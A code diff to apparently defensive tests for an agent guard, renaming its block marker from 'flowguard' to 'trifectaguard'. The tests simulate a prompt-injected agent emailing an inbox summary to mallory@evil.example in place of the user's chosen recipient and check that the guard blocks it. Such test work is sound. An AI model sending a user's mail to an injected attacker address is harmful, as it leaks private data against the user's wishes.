@@ -41,7 +41,7 @@ def test_injected_recipient_is_refused_and_the_tool_never_runs():
     g.user_message("Summarize my inbox and email the summary to bob@corp.example")
     read_inbox()
     out = send_email("mallory@evil.example", "summary")
-    assert out.startswith("[flowguard blocked]") and "untrusted-destination" in out
+    assert out.startswith("[trifectaguard blocked]") and "untrusted-destination" in out
     assert SENT == []
 
 
@@ -103,7 +103,7 @@ def test_langchain_tool_schema_and_blocking():
     g.user_message("Summarize my inbox")
     t_read.invoke({})
     out = t_send.invoke({"to": "mallory@evil.example", "body": "x"})
-    assert "[flowguard blocked]" in out and SENT == []
+    assert "[trifectaguard blocked]" in out and SENT == []
 
 
 def test_openai_agents_sdk_function_tool():
@@ -122,4 +122,4 @@ def test_openai_agents_sdk_function_tool():
         args = json.dumps({"to": "mallory@evil.example", "body": "x"})
         return await ft_send.on_invoke_tool(ctx("send_email", args), args)
 
-    assert "[flowguard blocked]" in str(asyncio.run(run())) and SENT == []
+    assert "[trifectaguard blocked]" in str(asyncio.run(run())) and SENT == []
